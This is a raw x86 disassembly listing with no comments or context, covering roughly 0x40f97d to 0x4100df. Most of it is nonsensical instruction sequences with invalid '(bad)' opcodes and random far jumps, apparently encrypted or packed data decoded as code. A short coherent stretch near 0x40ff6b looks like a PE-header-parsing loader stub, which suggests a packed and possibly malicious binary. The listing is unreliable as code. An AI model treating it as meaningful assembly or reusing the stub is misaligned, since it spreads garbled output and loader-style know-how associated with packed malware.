  40f97d:	rcl    DWORD PTR [ecx-0x67ca979c],0xb1
  40f984:	lds    ebx,FWORD PTR [ebp+0x77ec0bcd]
  40f98a:	sub    ebp,DWORD PTR [edi-0x31]
  40f98d:	xor    ch,bh
  40f98f:	test   DWORD PTR [esi+0x64544a78],ecx
  40f995:	inc    ecx
  40f996:	jb     0x40f982
  40f998:	outs   dx,BYTE PTR ds:[esi]
  40f999:	sub    bl,cl
  40f99b:	sub    BYTE PTR [ecx],al
  40f99d:	push   ebp
  40f99e:	cdq    
  40f99f:	cmp    BYTE PTR [esi-0x52],0xcf
  40f9a3:	pop    ss
  40f9a4:	out    0xfb,al
  40f9a6:	pop    ebx
  40f9a7:	dec    ebx
  40f9a8:	(bad)  
  40f9a9:	mov    bh,0xd5
  40f9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9ac:	push   es
  40f9ad:	stos   BYTE PTR es:[edi],al
  40f9ae:	pop    ebp
  40f9af:	(bad)  
  40f9b0:	push   ebx
  40f9b1:	jmp    0x50e06d7d
  40f9b6:	leave  
  40f9b7:	enter  0x5182,0xf2
  40f9bb:	or     ebx,DWORD PTR [ebp-0x6]
  40f9be:	push   esi
  40f9bf:	or     edi,esp
  40f9c1:	(bad)  
  40f9c3:	xor    eax,0x540e37b
  40f9c8:	mov    ebx,0x8c65c503
  40f9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ce:	sahf   
  40f9cf:	lea    esi,[edx+0x1d77ead1]
  40f9d5:	in     eax,dx
  40f9d6:	jne    0x40fa14
  40f9d8:	adc    bl,BYTE PTR [edx+0x7c14c9f]
  40f9de:	mov    bl,ah
  40f9e0:	push   ds
  40f9e1:	and    dl,0x17
  40f9e4:	push   ebp
  40f9e5:	jge    0x40f9dd
  40f9e7:	test   ebx,ecx
  40f9e9:	mov    eax,DWORD PTR [esi-0x19]
  40f9ec:	les    esp,FWORD PTR [ebp+0x45f4ce58]
  40f9f2:	(bad)  
  40f9f4:	xchg   esp,eax
  40f9f5:	stos   BYTE PTR es:[edi],al
  40f9f6:	sbb    al,0xb2
  40f9f8:	in     al,dx
  40f9f9:	mov    ecx,0xc6b7297a
  40f9fe:	jmp    0x40f9c2
  40fa00:	sbb    ebx,DWORD PTR [ebp+ebp*4+0x2b]
  40fa04:	dec    ebx
  40fa05:	xchg   edx,eax
  40fa06:	lods   eax,DWORD PTR ds:[esi]
  40fa07:	mov    WORD PTR [edi-0x16ab0ad9],?
  40fa0d:	lahf   
  40fa0e:	adc    BYTE PTR [ebp-0x57],bl
  40fa11:	mov    DWORD PTR [edx-0x2e],esi
  40fa14:	sub    ecx,edx
  40fa16:	xlat   BYTE PTR ds:[ebx]
  40fa17:	out    0x19,al
  40fa19:	ds nop
  40fa1b:	daa    
  40fa1c:	hlt    
  40fa1d:	xor    ah,cl
  40fa1f:	pusha  
  40fa20:	aas    
  40fa21:	test   al,0x14
  40fa23:	jmp    0x726d66d9
  40fa28:	(bad)  
  40fa2a:	ins    BYTE PTR es:[edi],dx
  40fa2b:	mov    al,ds:0x75f3c49a
  40fa30:	out    dx,al
  40fa31:	pop    esi
  40fa32:	pop    eax
  40fa33:	ins    BYTE PTR es:[edi],dx
  40fa34:	cmc    
  40fa35:	test   eax,0x8b03bc5f
  40fa3a:	mov    ah,0x24
  40fa3c:	jb     0x40fa32
  40fa3e:	cmp    al,BYTE PTR [esi+0x3b]
  40fa41:	(bad)  
  40fa42:	jae    0x40f9c4
  40fa44:	or     edx,DWORD PTR [eax-0x30]
  40fa47:	sub    edx,DWORD PTR [eax]
  40fa49:	inc    eax
  40fa4a:	aad    0xe
  40fa4c:	xchg   ebx,eax
  40fa4d:	lods   al,BYTE PTR ds:[esi]
  40fa4e:	aas    
  40fa4f:	adc    edx,DWORD PTR [ecx]
  40fa51:	and    eax,0x13a08b5c
  40fa56:	jmp    0xe3705bc9
  40fa5b:	outs   dx,DWORD PTR ds:[esi]
  40fa5c:	dec    edi
  40fa5d:	mov    esi,0xfaf6c486
  40fa62:	(bad)  
  40fa63:	fdivr  QWORD PTR [ebp+0x1b578664]
  40fa69:	rcr    DWORD PTR [edx+esi*2-0x41],cl
  40fa6d:	jp     0x40fa13
  40fa6f:	and    edi,esi
  40fa71:	push   cs
  40fa72:	jo     0x40faa3
  40fa74:	outs   dx,BYTE PTR ds:[esi]
  40fa75:	xor    DWORD PTR ds:[edx],edi
  40fa78:	hlt    
  40fa79:	ins    BYTE PTR es:[edi],dx
  40fa7a:	daa    
  40fa7b:	sub    BYTE PTR [ebp+0xa],al
  40fa7e:	add    ecx,0x71
  40fa81:	push   ss
  40fa82:	div    DWORD PTR [edx]
  40fa84:	in     eax,dx
  40fa85:	add    DWORD PTR [ebp+0x1b],ebx
  40fa88:	js     0x40fa9b
  40fa8a:	push   ebx
  40fa8b:	sub    BYTE PTR [ecx+0x686809ca],dl
  40fa91:	stos   DWORD PTR es:[edi],eax
  40fa92:	mov    ebp,0x803536eb
  40fa97:	es cli 
  40fa99:	push   eax
  40fa9a:	scas   al,BYTE PTR es:[edi]
  40fa9b:	xchg   esi,eax
  40fa9c:	add    BYTE PTR ds:0xd398c50e,bl
  40faa2:	imul   ebp,esi,0x619f382f
  40faa8:	shr    BYTE PTR [edx+0x8],1
  40faab:	retf   
  40faac:	cmp    al,0xcc
  40faae:	loop   0x40fb2f
  40fab0:	xor    BYTE PTR ds:0x26ba5fbf,al
  40fab6:	xchg   edi,eax
  40fab7:	cdq    
  40fab8:	xchg   edi,eax
  40fab9:	sub    al,0xa1
  40fabb:	or     esp,ebp
  40fabd:	sar    eax,cl
  40fabf:	fist   DWORD PTR ds:0x33493391
  40fac5:	popf   
  40fac6:	movaps xmm3,XMMWORD PTR [ebp+0x3d402034]
  40facd:	xchg   ecx,eax
  40face:	pop    ds
  40facf:	adc    DWORD PTR [edi-0x3f777cab],eax
  40fad5:	stc    
  40fad6:	mov    eax,0xea0fe10e
  40fadb:	add    DWORD PTR [edx-0x7c],edi
  40fade:	bound  edx,QWORD PTR [ecx]
  40fae0:	push   eax
  40fae1:	add    al,0x40
  40fae3:	push   cs
  40fae4:	popf   
  40fae5:	gs call 0x783bae57
  40faeb:	dec    cx
  40faed:	mov    ecx,0xffefc3ec
  40faf2:	sub    al,BYTE PTR ds:0xab9fe4a3
  40faf8:	int    0x5e
  40fafa:	or     DWORD PTR [edx-0x3d],0xca0279b8
  40fb01:	adc    BYTE PTR [ebx-0x10de832a],ah
  40fb07:	stos   DWORD PTR es:[edi],eax
  40fb08:	into   
  40fb09:	jmp    0x40fb5f
  40fb0b:	int3   
  40fb0c:	daa    
  40fb0d:	pop    edx
  40fb0e:	enter  0xcbe9,0x3b
  40fb12:	mov    DWORD PTR [ebp+0x44],edx
  40fb15:	xor    eax,0xc5695e89
  40fb1a:	es (bad) 
  40fb1c:	(bad)  
  40fb1d:	out    dx,eax
  40fb1e:	push   esi
  40fb1f:	ret    0xf32c
  40fb22:	adc    DWORD PTR [ecx+0x79],ebx
  40fb25:	push   ebp
  40fb26:	ins    DWORD PTR es:[edi],dx
  40fb27:	in     al,0x7
  40fb29:	mov    edx,0xad4570ee
  40fb2e:	inc    esp
  40fb2f:	ins    BYTE PTR es:[edi],dx
  40fb30:	repnz pusha 
  40fb32:	retf   0xb05f
  40fb35:	sub    ch,0xab
  40fb38:	fld    TBYTE PTR [ebp+0x17]
  40fb3b:	push   ds
  40fb3c:	mov    al,0x48
  40fb3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb3f:	mov    bl,0xe
  40fb41:	xor    al,0x10
  40fb43:	mov    ds,ebx
  40fb45:	mov    ebx,0xd44a0c34
  40fb4a:	inc    eax
  40fb4b:	imul   esp,DWORD PTR [ebp+0x2d32b612],0xffffffeb
  40fb52:	dec    ebp
  40fb53:	dec    ecx
  40fb54:	test   BYTE PTR [esi+0x50],bl
  40fb57:	daa    
  40fb58:	aam    0x4a
  40fb5a:	(bad)  
  40fb5b:	mov    cl,0xf1
  40fb5d:	jns    0x40fbd8
  40fb5f:	out    dx,eax
  40fb60:	fcomp  QWORD PTR [edx-0x7d]
  40fb63:	or     ch,BYTE PTR [edx]
  40fb65:	std    
  40fb66:	cwde   
  40fb67:	fild   QWORD PTR [eax]
  40fb69:	mov    ds:0xc4b84cd1,eax
  40fb6e:	jle    0x40fba0
  40fb70:	push   es
  40fb71:	ds aad 0x5
  40fb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb75:	sub    edi,DWORD PTR [ebx]
  40fb77:	mov    bh,dl
  40fb79:	sub    ebp,0x8fac38c1
  40fb7f:	jmp    0x9b8e:0xba71bb61
  40fb86:	and    al,0xe3
  40fb88:	std    
  40fb89:	in     al,0x81
  40fb8b:	xor    ch,BYTE PTR [eax]
  40fb8d:	jno    0x40fb98
  40fb8f:	lods   al,BYTE PTR ds:[esi]
  40fb90:	pop    eax
  40fb91:	dec    eax
  40fb92:	lods   al,BYTE PTR ds:[esi]
  40fb93:	or     ah,0xad
  40fb96:	pop    esi
  40fb97:	ret    
  40fb98:	mov    WORD PTR [ecx+edx*2-0x9],es
  40fb9c:	sbb    eax,0x42e1a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0xe2
  40fbb3:	cmp    BYTE PTR [ecx+ebx*8],ch
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fbd3
  40fbbf:	cmp    ah,ah
  40fbc1:	(bad)  
  40fbc2:	push   ds
  40fbc3:	push   cs
  40fbc4:	outs   dx,BYTE PTR ds:[esi]
  40fbc5:	mov    ecx,0x303814d6
  40fbca:	fld    st(6)
  40fbcc:	aaa    
  40fbcd:	idiv   BYTE PTR [esi+0x63]
  40fbd0:	push   ebp
  40fbd1:	mov    ds:0xf10a22e3,al
  40fbd6:	aam    0x5b
  40fbd8:	ja     0x40fc34
  40fbda:	mov    bl,0xd
  40fbdc:	out    dx,eax
  40fbdd:	dec    BYTE PTR [edi-0x6b7c65a9]
  40fbe3:	sti    
  40fbe4:	pop    ecx
  40fbe5:	loope  0x40fc30
  40fbe7:	test   BYTE PTR cs:[ecx],ah
  40fbea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbeb:	in     al,0xeb
  40fbed:	sub    bl,BYTE PTR [esi+0x5bc22739]
  40fbf3:	je     0x40fb9f
  40fbf5:	lahf   
  40fbf6:	mov    BYTE PTR ds:0x4013c34,ch
  40fbfd:	daa    
  40fbfe:	int    0xd4
  40fc00:	pusha  
  40fc01:	adc    BYTE PTR [eax+ebx*8+0x3defc326],ch
  40fc08:	fwait
  40fc09:	jg     0x40fc27
  40fc0b:	cmp    DWORD PTR [edx],ecx
  40fc0d:	inc    esi
  40fc0e:	add    cl,dh
  40fc10:	xor    al,0xf6
  40fc12:	(bad)  
  40fc13:	ja     0x40fbda
  40fc15:	and    ah,BYTE PTR [edi+0x30]
  40fc18:	push   edx
  40fc19:	mov    ebx,0x41f97c89
  40fc1e:	gs sub edi,ecx
  40fc21:	mov    ah,BYTE PTR [eax-0x6b581659]
  40fc27:	jo     0x40fc4f
  40fc29:	jb     0x40fc9b
  40fc2b:	add    DWORD PTR [edi+esi*4+0x50],0x36
  40fc30:	mov    ?,esp
  40fc32:	or     al,0xd3
  40fc34:	push   esp
  40fc35:	in     al,0x9
  40fc37:	pop    ebx
  40fc38:	inc    edi
  40fc39:	cmc    
  40fc3a:	inc    edi
  40fc3b:	dec    esp
  40fc3c:	xor    cl,bh
  40fc3e:	sahf   
  40fc3f:	adc    DWORD PTR [ebp-0x2c],ebp
  40fc42:	jle    0x40fc72
  40fc44:	ins    BYTE PTR es:[edi],dx
  40fc45:	stc    
  40fc46:	out    0x7d,eax
  40fc48:	sahf   
  40fc49:	sbb    BYTE PTR ds:0x38c16032,ch
  40fc4f:	pusha  
  40fc50:	or     BYTE PTR [ecx-0x7ba6fa5d],dl
  40fc56:	je     0x40fc55
  40fc58:	lock scas al,BYTE PTR es:[edi]
  40fc5a:	lds    esi,FWORD PTR [ecx+0x37c7a2d]
  40fc60:	jmp    0x3f8112fa
  40fc65:	mov    ecx,0xeb8f3ecd
  40fc6a:	test   al,0xe1
  40fc6c:	add    ebx,DWORD PTR [edx+0x2d]
  40fc6f:	cmp    DWORD PTR [esi-0x50ffbac7],esi
  40fc75:	aaa    
  40fc76:	scas   eax,DWORD PTR es:[edi]
  40fc77:	bts    DWORD PTR [edi-0x51],0xd
  40fc7c:	gs out 0xca,al
  40fc7f:	lds    ebx,FWORD PTR [ebp-0x5b337f2c]
  40fc85:	int    0x9d
  40fc87:	pop    es
  40fc88:	cs xchg ebp,eax
  40fc8a:	in     eax,0x26
  40fc8c:	fst    DWORD PTR [esi]
  40fc8e:	and    eax,DWORD PTR [ebx+0x64]
  40fc91:	sbb    BYTE PTR [eax],bh
  40fc93:	or     esp,DWORD PTR [edi-0x4a]
  40fc96:	sub    al,0xa0
  40fc98:	jmp    0x45e0da85
  40fc9d:	fmul   DWORD PTR [esi-0x1303d29c]
  40fca3:	(bad)  
  40fca4:	cmc    
  40fca5:	and    ah,bh
  40fca7:	imul   ebp,DWORD PTR [eax],0x4a350a92
  40fcad:	test   al,0x9d
  40fcaf:	popa   
  40fcb0:	pop    es
  40fcb1:	jmp    0x40fc9f
  40fcb3:	imul   edi,DWORD PTR [ecx+0xc],0x12048361
  40fcba:	and    eax,0x984d1588
  40fcbf:	nop
  40fcc0:	or     al,0xdb
  40fcc2:	(bad)  
  40fcc4:	jmp    0x40fd32
  40fcc6:	mov    WORD PTR [eax+0x451d897e],gs
  40fccc:	xchg   DWORD PTR [esi+ebx*2-0x3b],esp
  40fcd0:	call   0xadf:0x9e3c6179
  40fcd7:	imul   edx,DWORD PTR [edi-0xa630892],0xfffffff1
  40fcde:	and    al,0xc2
  40fce0:	xchg   edi,eax
  40fce1:	pop    esp
  40fce2:	dec    ecx
  40fce3:	xchg   esp,eax
  40fce4:	xor    DWORD PTR [eax+eiz*2+0x6fb8861b],ebp
  40fceb:	jmp    0x4bff40b0
  40fcf0:	cmp    esi,DWORD PTR [edx]
  40fcf2:	scas   al,BYTE PTR es:[edi]
  40fcf3:	cld    
  40fcf4:	retf   
  40fcf5:	lods   al,BYTE PTR ds:[esi]
  40fcf6:	ficomp DWORD PTR [esi-0x6533add2]
  40fcfc:	sub    ebx,DWORD PTR [eax+0x20023ebd]
  40fd02:	jl     0x40fce0
  40fd04:	cs inc edx
  40fd06:	std    
  40fd07:	repnz cmp al,0x0
  40fd0a:	shl    DWORD PTR [ebx-0x4395eccf],1
  40fd10:	jae    0x40fd18
  40fd12:	fwait
  40fd13:	aaa    
  40fd14:	xchg   esp,eax
  40fd15:	call   0x52f9236d
  40fd1a:	xchg   ebp,eax
  40fd1b:	add    bh,al
  40fd1d:	outs   dx,DWORD PTR ds:[esi]
  40fd1e:	cdq    
  40fd1f:	dec    eax
  40fd20:	sub    esp,eax
  40fd22:	and    DWORD PTR [ebx+0x5b],0x1d6b11e4
  40fd29:	mov    dl,0xc5
  40fd2b:	hlt    
  40fd2c:	(bad)  
  40fd2d:	jo     0x40fd56
  40fd2f:	cld    
  40fd30:	cmp    bh,bh
  40fd32:	jb     0x40fcfa
  40fd34:	dec    ebp
  40fd35:	mov    ebx,0x915e3161
  40fd3a:	das    
  40fd3b:	add    dh,BYTE PTR [edx]
  40fd3d:	mov    bh,0x70
  40fd3f:	dec    eax
  40fd40:	cmp    edi,DWORD PTR [edx+0x7a]
  40fd43:	shl    BYTE PTR [ebp+0x42],0xaa
  40fd47:	dec    ecx
  40fd48:	pop    eax
  40fd49:	aad    0x18
  40fd4b:	and    DWORD PTR [eax+0x2879d504],edx
  40fd51:	mov    dh,0x59
  40fd53:	outs   dx,DWORD PTR ds:[esi]
  40fd54:	sbb    BYTE PTR [edx+ebp*4],dl
  40fd57:	sbb    al,0x4b
  40fd59:	jo     0x40fd23
  40fd5b:	jmp    0x180b009f
  40fd60:	arpl   di,bp
  40fd62:	dec    esi
  40fd63:	in     al,0x8c
  40fd65:	mov    ds:0x6f14cdd7,al
  40fd6a:	jmp    0x72d678b5
  40fd6f:	pop    eax
  40fd70:	xor    al,ah
  40fd72:	or     BYTE PTR [esi-0x65],ah
  40fd75:	cli    
  40fd76:	mov    ebx,edi
  40fd78:	sahf   
  40fd79:	add    BYTE PTR [ecx-0x54],cl
  40fd7c:	sub    ch,BYTE PTR [ebp-0x77]
  40fd7f:	cwde   
  40fd80:	mov    dh,0x97
  40fd82:	dec    eax
  40fd83:	loope  0x40fd18
  40fd85:	stos   BYTE PTR es:[edi],al
  40fd86:	pop    edx
  40fd87:	inc    esp
  40fd88:	mov    cl,0xa3
  40fd8a:	sbb    eax,DWORD PTR [esi+0x4e41abfd]
  40fd90:	pop    ebp
  40fd91:	icebp  
  40fd92:	call   ebp
  40fd94:	push   es
  40fd95:	sbb    BYTE PTR [edx],bl
  40fd97:	aas    
  40fd98:	sahf   
  40fd99:	data16 adc dh,BYTE PTR [ecx+0x7e]
  40fd9d:	inc    edx
  40fd9e:	pop    esi
  40fd9f:	jne    0x40fd38
  40fda1:	scas   al,BYTE PTR es:[edi]
  40fda2:	mov    fs,WORD PTR [ebx-0x4dfef304]
  40fda8:	ret    0xe6d5
  40fdab:	enter  0xd153,0x6a
  40fdaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb0:	sub    BYTE PTR [ebx+eiz*1],0x32
  40fdb4:	adc    ebx,DWORD PTR [edi+edi*2+0x5f27f3f1]
  40fdbb:	ret    0x44f3
  40fdbe:	xlat   BYTE PTR ds:[ebx]
  40fdbf:	mov    al,ds:0x8fbcfc96
  40fdc4:	xchg   BYTE PTR [edi-0x12],dh
  40fdc7:	pop    ebx
  40fdc8:	aas    
  40fdc9:	sub    al,0xd8
  40fdcb:	pop    ebp
  40fdcc:	mov    ebx,0xaadbe990
  40fdd1:	dec    esi
  40fdd2:	ss pop es
  40fdd4:	repz stc 
  40fdd6:	add    esi,DWORD PTR [edx+eiz*8+0x68c20242]
  40fddd:	ret    0xae6a
  40fde0:	jle    0x40fe30
  40fde2:	and    DWORD PTR [edi-0x4a5bc2fe],ebx
  40fde8:	inc    edx
  40fde9:	std    
  40fdea:	mov    bh,0xd1
  40fdec:	test   DWORD PTR [esp+ebp*2],esi
  40fdef:	arpl   WORD PTR [ebx-0x5b219314],cx
  40fdf5:	data16 into 
  40fdf7:	xchg   esp,eax
  40fdf8:	lods   eax,DWORD PTR ds:[esi]
  40fdf9:	adc    eax,eax
  40fdfb:	arpl   ax,dx
  40fdfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdfe:	cmc    
  40fdff:	jae    0x40fe74
  40fe01:	mov    esp,DWORD PTR [esi]
  40fe03:	push   ecx
  40fe04:	jae    0x40fe56
  40fe06:	fs pop eax
  40fe08:	repnz add eax,0xe9c99f27
  40fe0e:	ins    DWORD PTR es:[edi],dx
  40fe0f:	adc    esp,DWORD PTR [ebp-0xf]
  40fe12:	dec    ebp
  40fe13:	out    dx,eax
  40fe14:	inc    ebx
  40fe15:	test   BYTE PTR [ebp-0x487acbee],bl
  40fe1b:	shr    BYTE PTR [eax+0x6a],1
  40fe1e:	or     DWORD PTR [ecx],ebx
  40fe20:	push   0xffffff9e
  40fe22:	call   0x915c:0x3fe1ccf6
  40fe29:	jp     0x40fe9d
  40fe2b:	(bad)  
  40fe2c:	mov    ch,0x33
  40fe2e:	dec    ebx
  40fe2f:	jbe    0x40fea7
  40fe31:	imul   DWORD PTR ds:0xf3ed2a10
  40fe37:	cld    
  40fe38:	xchg   esp,eax
  40fe39:	rol    cl,cl
  40fe3b:	push   ebx
  40fe3c:	mov    esp,0x4bf7ff47
  40fe41:	cmp    edx,DWORD PTR [edx]
  40fe43:	std    
  40fe44:	xchg   DWORD PTR [esp+ebx*8+0x176ddb4b],ebx
  40fe4b:	or     esi,ebx
  40fe4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe4e:	inc    edx
  40fe4f:	and    DWORD PTR [eax+ebx*8],ebx
  40fe52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe53:	mov    bh,BYTE PTR [esi]
  40fe55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe56:	aaa    
  40fe57:	ds pop esi
  40fe59:	das    
  40fe5a:	nop
  40fe5b:	sar    BYTE PTR [eax],0x2e
  40fe5e:	cld    
  40fe5f:	push   0x27
  40fe61:	call   0x45f6ba78
  40fe66:	(bad)  
  40fe68:	jge    0x40fe7e
  40fe6a:	adc    DWORD PTR [edi+0x7d006af9],ebx
  40fe70:	dec    edx
  40fe71:	cmp    eax,0xeb63e4c1
  40fe76:	pop    ebx
  40fe77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe78:	inc    eax
  40fe79:	adc    BYTE PTR [edi+eiz*4+0x79],cl
  40fe7d:	iret   
  40fe7e:	iret   
  40fe7f:	int3   
  40fe80:	xlat   BYTE PTR ds:[ebx]
  40fe81:	dec    esp
  40fe82:	push   ecx
  40fe83:	xor    eax,0x50b424e9
  40fe88:	cmp    eax,0x83472245
  40fe8d:	shr    bh,0x66
  40fe90:	jle    0x40fe53
  40fe92:	mov    bh,BYTE PTR ds:0xd7e2b1ad
  40fe98:	cli    
  40fe99:	bound  esp,QWORD PTR [esi+0x5df87aca]
  40fe9f:	ja     0x40fea1
  40fea1:	xchg   edx,eax
  40fea2:	pop    edx
  40fea3:	cmp    DWORD PTR [ebx+eiz*8+0x32],esi
  40fea7:	clc    
  40fea8:	faddp  st(6),st
  40feaa:	dec    ecx
  40feab:	or     bl,BYTE PTR [edi+ebx*2+0x5e]
  40feaf:	add    dh,BYTE PTR [ebx+ebx*2+0x16]
  40feb3:	sbb    DWORD PTR [edx+0x50cc0ab8],eax
  40feb9:	inc    ebx
  40feba:	int    0xd
  40febc:	jno    0x40ff27
  40febe:	push   edi
  40febf:	ja     0x40fe7a
  40fec1:	xor    eax,0xc7fbdad1
  40fec6:	or     ah,bh
  40fec8:	jmp    0x7f4d:0x5219cb18
  40fecf:	or     al,0xd8
  40fed1:	mov    esi,0x3ec50628
  40fed6:	mov    eax,0xe3ffe3d
  40fedb:	shr    DWORD PTR [edx],1
  40fedd:	sbb    al,cl
  40fedf:	int3   
  40fee0:	dec    edi
  40fee1:	aaa    
  40fee2:	imul   esi
  40fee4:	adc    eax,DWORD PTR [ecx+0x12aeb692]
  40feea:	jmp    0xf742:0x8d89fb3d
  40fef1:	int    0xe1
  40fef3:	sbb    BYTE PTR [edi+0x5b],ah
  40fef6:	mov    esp,DWORD PTR ds:0xf1fcdabd
  40fefc:	cli    
  40fefd:	jnp    0x40ff0f
  40feff:	lds    edi,FWORD PTR [edi-0x47]
  40ff02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff03:	ins    BYTE PTR es:[edi],dx
  40ff04:	push   esp
  40ff05:	rcr    BYTE PTR [ecx],0xc8
  40ff08:	pop    ebx
  40ff09:	adc    eax,0x5d644a2d
  40ff0e:	aaa    
  40ff0f:	in     eax,0xe5
  40ff11:	sar    BYTE PTR [edx+edi*2+0x35],0xd4
  40ff16:	sbb    eax,0x51d9bb12
  40ff1b:	xchg   cl,ch
  40ff1d:	xchg   ecx,eax
  40ff1e:	add    DWORD PTR [esi],esi
  40ff20:	test   BYTE PTR [ebx-0x53],0x4c
  40ff24:	cdq    
  40ff25:	sbb    eax,0x25bf5fb6
  40ff2a:	add    eax,0xd983bc14
  40ff2f:	or     edx,esp
  40ff31:	in     eax,dx
  40ff32:	xor    eax,0xb742cae6
  40ff37:	ins    BYTE PTR es:[edi],dx
  40ff38:	xor    ecx,DWORD PTR [ebp*4+0x432f0a5e]
  40ff3f:	or     esp,DWORD PTR [ecx]
  40ff41:	and    DWORD PTR [eax-0x13],ebp
  40ff44:	sbb    BYTE PTR ds:0xab7eeb42,ch
  40ff4a:	clc    
  40ff4b:	jo     0x40ff46
  40ff4d:	or     eax,0x768ac844
  40ff52:	nop
  40ff53:	add    al,BYTE PTR [ebx+0x16]
  40ff56:	add    DWORD PTR [ebp+0x365279a0],ebx
  40ff5c:	mul    BYTE PTR [ebp-0x7894aaf4]
  40ff62:	sub    esp,DWORD PTR [ebp-0x1b]
  40ff65:	inc    eax
  40ff66:	and    DWORD PTR [ebx-0x46],edi
  40ff69:	(bad)  
  40ff6b:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40ff72:	mov    eax,DWORD PTR [ebp+0x8]
  40ff75:	mov    al,BYTE PTR [eax]
  40ff77:	mov    DWORD PTR ds:0x42e1b4,0x3a3a
  40ff81:	add    al,0x37
  40ff83:	xor    DWORD PTR ds:0x42e777,0x42fdfe
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fd51,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fdf6
  40ffaa:	and    edx,DWORD PTR ds:0x42e77b
  40ffb0:	mov    DWORD PTR ds:0x42fdf6,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e783,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	out    0xbc,eax
  40ffde:	mov    ebp,0x70bd355f
  40ffe3:	jo     0x40ff88
  40ffe5:	jge    0x410057
  40ffe7:	jo     0x41001a
  40ffe9:	das    
  40ffea:	fwait
  40ffeb:	out    0xe4,eax
  40ffed:	clc    
  40ffee:	sub    al,BYTE PTR ds:0xea6ed7ce
  40fff4:	mov    cl,ah
  40fff6:	(bad)  
  40fff7:	sub    ebp,DWORD PTR [ecx+0x3e50047d]
  40fffd:	push   es
  40fffe:	jg     0x410045
  410000:	pushf  
  410001:	aas    
  410002:	push   esp
  410003:	add    ch,ah
  410005:	inc    ebp
  410006:	pusha  
  410007:	xchg   edi,eax
  410008:	jb     0x40ffdd
  41000a:	pop    esi
  41000b:	pop    ebp
  41000c:	imul   esi,DWORD PTR [edx+0x73],0x1bbcb5a5
  410013:	push   eax
  410014:	test   DWORD PTR [ecx-0x4495a9cc],edi
  41001a:	test   dl,bh
  41001c:	inc    ebx
  41001d:	stc    
  41001e:	ret    
  41001f:	out    dx,eax
  410020:	lds    esi,FWORD PTR [edi+edi*8]
  410023:	ins    DWORD PTR es:[edi],dx
  410024:	xchg   edi,eax
  410025:	or     BYTE PTR [esp+eax*4-0x165e9b00],bl
  41002c:	clc    
  41002d:	sub    al,0x5
  41002f:	jmp    0x41000f
  410031:	adc    DWORD PTR [ecx-0x700a8a09],eax
  410037:	sub    eax,0xe50154d5
  41003c:	add    al,0x5
  41003e:	loope  0x4100b4
  410040:	clc    
  410041:	shl    BYTE PTR [edx],cl
  410043:	icebp  
  410044:	xchg   ecx,eax
  410045:	movsx  eax,BYTE PTR [esi-0x603c6834]
  41004c:	mov    dh,0xf7
  41004e:	push   eax
  41004f:	jp     0x4100be
  410051:	dec    edx
  410052:	inc    ecx
  410053:	loopne 0x4100a0
  410055:	ret    0xd721
  410058:	dec    eax
  410059:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41005a:	imul   DWORD PTR [esi+0x7f891e2a]
  410060:	cmp    esi,DWORD PTR [edi]
  410062:	int    0x6
  410064:	mov    dh,0xf8
  410066:	lods   al,BYTE PTR ds:[esi]
  410067:	xor    BYTE PTR [eax],cl
  410069:	pop    edi
  41006a:	mov    DWORD PTR [edi-0x79],ebp
  41006d:	push   ebx
  41006e:	inc    edi
  41006f:	xchg   BYTE PTR [eax-0x1a],bl
  410072:	ror    DWORD PTR [edx+0x6583387e],0xc3
  410079:	mov    ebp,0x7127d5ba
  41007e:	inc    ebp
  41007f:	cmp    DWORD PTR [edx+0x31],0xffffffbe
  410083:	jle    0x4100e8
  410085:	mul    BYTE PTR [ebp+esi*1-0x3]
  410089:	das    
  41008a:	ss push esp
  41008c:	(bad)  
  41008e:	xchg   edi,eax
  41008f:	pop    es
  410090:	ret    0x9831
  410093:	cmp    al,0x6
  410095:	mov    ah,0xe5
  410097:	or     eax,0xa011ec8f
  41009c:	xor    DWORD PTR [eax],esi
  41009e:	icebp  
  41009f:	out    0x52,al
  4100a1:	repz pushf 
  4100a3:	enter  0x7dc6,0x8b
  4100a7:	cmp    DWORD PTR gs:[edi],esi
  4100aa:	fistp  DWORD PTR ss:[eax+edx*1]
  4100ae:	xor    edi,DWORD PTR fs:[ebp+0x6c]
  4100b2:	mov    edx,cs
  4100b4:	test   DWORD PTR [ebp+0x25],ebx
  4100b7:	call   0x769a:0x2850ac83
  4100be:	fist   DWORD PTR [eax+eiz*2+0x58]
  4100c2:	mov    edx,0xd6225f27
  4100c7:	adc    BYTE PTR [ecx],dh
  4100c9:	and    ch,BYTE PTR [esi+0x2b88d0cb]
  4100cf:	std    
  4100d0:	test   edi,esp
  4100d2:	or     BYTE PTR [esp+esi*2],al
  4100d5:	xchg   DWORD PTR [ebx],eax
  4100d7:	ret    
  4100d8:	mov    esi,0xf300c09
  4100dd:	xchg   bh,dl
  4100df:	push   esp
